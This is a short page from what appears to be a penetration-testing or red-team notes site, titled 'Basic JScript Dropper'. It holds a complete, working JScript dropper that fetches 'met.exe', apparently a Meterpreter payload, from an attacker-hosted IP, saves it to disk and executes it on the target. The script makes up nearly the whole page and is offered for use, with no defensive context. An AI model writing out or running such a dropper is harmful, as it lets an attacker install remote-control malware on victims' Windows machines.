---
title: Basic JScript Dropper
layout: default
parent: Client Side Execution
nav_order: 7
---

First you need to host the program, then run this as a js file in the target:

```
var url = "http://IP/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200)
{
var Stream = WScript.CreateObject('ADODB.Stream');
Stream.Open();
Stream.Type = 1;
Stream.Write(Object.ResponseBody);
Stream.Position = 0;
Stream.SaveToFile("met.exe", 2);
Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```
